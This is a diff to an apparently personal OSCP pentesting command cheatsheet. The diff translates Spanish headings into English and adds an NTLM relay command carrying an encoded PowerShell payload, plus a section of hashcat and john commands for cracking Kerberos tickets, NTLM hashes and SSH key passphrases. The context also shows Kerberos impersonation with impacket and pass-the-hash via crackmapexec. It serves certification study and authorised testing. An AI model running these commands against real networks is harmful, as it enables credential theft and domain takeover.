@@ -2,7 +2,7 @@
 
 Just a handful of commands I normally use. There a lot of things that are missing, I will be updating this regularly as I keep learning/practicing new things.
 
-Spanglish included, this is a cheatsheet. 
+Expect Spanglish, this is a cheatsheet. 
 
 - [Misc Commands from Linux](#misc-commands-from-linux)
    - [Strings and files manipulation](#strings-and-files-manipulation)
@@ -14,13 +14,16 @@ Spanglish included, this is a cheatsheet.
 - [Port Scanning](#port-scanning)
 - [Web Directory Scanning (and related)](#web-directory-scanning-and-related)
 - [DNS Enumeration](#dns-enumeration)
-- [Enumerar LDAP manualmente usando consola Python](#enumerar-ldap-manualmente-usando-consola-python)
-- [Enumerar SMB](#enumerar-smb)
-- [Enumerar RPC](#enumerar-rpc)
-- [Ataques a Kerberos](#ataques-a-kerberos)
+- [Manually enumerate LDAP through Python console](#manually-enumerate-ldap-through-python-console)
+- [SMB Enumeration](#smb-enumeration)
+- [RPC Enumeration](#rpc-enumeration)
+- [Kerberos Attacks](#kerberos-attacks)
+- [Hascat, John and HashCracking related](#hascat,john-and-hashcracking-related)
 
 
 ## Misc Commands from Linux
+
+(Back to top)[# oscp-command-cheatsheet]
 
 ### Strings and files manipulation
 
@@ -214,6 +217,8 @@ NET USE f: \\ip_kali\nombre_deseado_share /PERSISTENT:YES
 
 ## Port Scanning
 
+This only contains what I normally use, there are more options available at [S4vitar - Preparación OSCP - Port Scanning](https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e#port-scanning)
+
 ```
 
 # Puertos abiertos
@@ -286,9 +291,9 @@ dig axfr  @<DNS_IP> <DOMAIN>
 
 ```
 
-## Enumerar LDAP manualmente usando consola Python 
+## Manually enumerate LDAP through Python console
 
-Más filtros de búsqueda LDAP en [Jonlabelle Gist](https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7) 
+More LDAP search filters available at [Jonlabelle Gist](https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7) 
 
 ```
 >>> import ldap3
@@ -318,7 +323,7 @@ Más filtros de búsqueda LDAP en [Jonlabelle Gist](https://gist.github.com/jonl
 
 ```
 
-## Enumerar SMB
+## SMB Enumeration
 
 ```
 
@@ -364,7 +369,7 @@ crackmapexec smb 192.168.10.11 [-d Domain] -u Administrator -H <NTHASH> -x whoam
 
 ```
 
-## Enumerar RPC
+## RPC Enumeration
 
 ```
 
@@ -422,7 +427,7 @@ netsharegetinfo <share>
 
 ```
 
-## Ataques a Kerberos
+## Kerberos attacks
 
 Recomendado [Tarlogic - ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/#Kerberoasting)
 
@@ -462,4 +467,51 @@ impacket-psexec intelligence.htb/administrator@dc.intelligence.htb -k -no-pass
 impacket-getST -spn "cifs/serviceA" -impersonate "administrator" "domain/serviceB:password" # Este comando guarda el ticket en administrator.ccache
 export KRB5CCNAME=administrator.ccache
 impacket-psexec intelligence.htb/administrator@dc.intelligence.htb -k -no-pass
+
+#NTLM Relay Attack
+sudo python /usr/local/bin/ntlmrelayx.py --no-http-server -smb2support -t <target_ip> -c "powershell -enc JABjAGwAaQ..."
+
+```
+
+## Hascat, John and HashCracking related
+
+```
+
+# Hash detection using [Name-That-Hash](https://github.com/HashPals/Name-That-Hash)
+nth -f hash_file --no-banner -a
+
+# TGS cracking
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
+john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
+
+# AS_REP cracking
+hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
+
+# NetNTLMv2 hash cracking
+hashcat -m 5600 -a 0 -r rules/best64.rule hashes rockyou.txt
+
+# NTLM hash cracking
+hashcat -m 1000 -a 0 -r rules/best64.rule hashes rockyou.txt
+
+# MD5 hash cracking
+ hashcat.exe -m 0 --user -a 0 userPassHashes.txt rockyou.txt (--user flag may be omitted, it indicates that the hash file's format is  username:<md5 hash>)
+
+# Wordpress,phpass, Joomla MD5 hash cracking
+john --format=crypt hash.txt --wordlist:/your/wordlist/list.txt
+
+# Cracking ID_RSA hash to obtain passphrase
+ssh2john id_rsa >id_rsa.hash
+john id_rsa.hash -w=rockyou.txt
+hashcat -m 22911 -a 0 id_rsa.hash rockyou.txt   # $sshng$0$
+hashcat -m 22921 -a 0 id_rsa.hash rockyou.txt   # $sshng$6$
+hashcat -m 22931 -a 0 id_rsa.hash rockyou.txt   # $sshng$1$
+hashcat -m 22941 -a 0 id_rsa.hash rockyou.txt   # $sshng$4$
+hashcat -m 22951 -a 0 id_rsa.hash rockyou.txt   # $sshng$5$
+
+# Yescrypt hash cracking
+john --format=crypt hash.txt --wordlist:/your/wordlist/list.txt
+
+
+
+
 
